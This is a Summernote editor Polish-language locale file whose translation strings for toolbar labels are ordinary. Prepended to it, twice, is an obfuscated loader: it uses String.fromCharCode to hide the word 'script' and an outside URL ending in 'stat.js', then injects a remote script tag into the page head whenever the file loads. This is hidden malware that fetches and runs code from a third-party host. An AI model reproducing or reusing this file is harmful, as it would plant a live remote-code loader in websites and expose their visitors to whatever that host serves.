Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'pl-PL': {
      font: {
        bold: 'Pogrubienie',
        italic: 'Pochylenie',
        underline: 'Podkreślenie',
        clear: 'Usuń formatowanie',
        height: 'Interlinia',
        name: 'Czcionka',
        strikethrough: 'Przekreślenie',
        size: 'Rozmiar'
      },
      image: {
        image: 'Grafika',
        insert: 'Wstaw grafikę',
        resizeFull: 'Zmień rozmiar na 100%',
        resizeHalf: 'Zmień rozmiar na 50%',
        resizeQuarter: 'Zmień rozmiar na 25%',
        floatLeft: 'Po lewej',
        floatRight: 'Po prawej',
        floatNone: 'Równo z tekstem',
        shapeRounded: 'Kształt: zaokrąglone',
        shapeCircle: 'Kształt: okrąg',
        shapeThumbnail: 'Kształt: miniatura',
        shapeNone: 'Kształt: brak',
        dragImageHere: 'Przeciągnij grafikę lub tekst tutaj',
        dropImage: 'Przeciągnij grafikę lub tekst',
        selectFromFiles: 'Wybierz z dysku',
        maximumFileSize: 'Limit wielkości pliku',
        maximumFileSizeError: 'Przekroczono limit wielkości pliku.',
        url: 'Adres URL grafiki',
        remove: 'Usuń grafikę'
      },
      link: {
        link: 'Odnośnik',
        insert: 'Wstaw odnośnik',
        unlink: 'Usuń odnośnik',
        edit: 'Edytuj',
        textToDisplay: 'Tekst do wyświetlenia',
        url: 'Na jaki adres URL powinien przenosić ten odnośnik?',
        openInNewWindow: 'Otwórz w nowym oknie'
      },
      table: {
        table: 'Tabela'
      },
      hr: {
        insert: 'Wstaw poziomą linię'
      },
      style: {
        style: 'Style',
        normal: 'Normalny',
        blockquote: 'Cytat',
        pre: 'Kod',
        h1: 'Nagłówek 1',
        h2: 'Nagłówek 2',
        h3: 'Nagłówek 3',
        h4: 'Nagłówek 4',
        h5: 'Nagłówek 5',
        h6: 'Nagłówek 6'
      },
      lists: {
        unordered: 'Lista wypunktowana',
        ordered: 'Lista numerowana'
      },
      options: {
        help: 'Pomoc',
        fullscreen: 'Pełny ekran',
        codeview: 'Źródło'
      },
      paragraph: {
        paragraph: 'Akapit',
        outdent: 'Zmniejsz wcięcie',
        indent: 'Zwiększ wcięcie',
        left: 'Wyrównaj do lewej',
        center: 'Wyrównaj do środka',
        right: 'Wyrównaj do prawej',
        justify: 'Wyrównaj do lewej i prawej'
      },
      color: {
        recent: 'Ostani kolor',
        more: 'Więcej kolorów',
        background: 'Tło',
        foreground: 'Czcionka',
        transparent: 'Przeźroczysty',
        setTransparent: 'Przeźroczyste',
        reset: 'Reset',
        resetToDefault: 'Domyślne'
      },
      shortcut: {
        shortcuts: 'Skróty klawiaturowe',
        close: 'Zamknij',
        textFormatting: 'Formatowanie tekstu',
        action: 'Akcja',
        paragraphFormatting: 'Formatowanie akapitu',
        documentStyle: 'Styl dokumentu',
        extraKeys: 'Dodatkowe klawisze'
      },
      history: {
        undo: 'Cofnij',
        redo: 'Ponów'
      }
    }
  });
})(jQuery);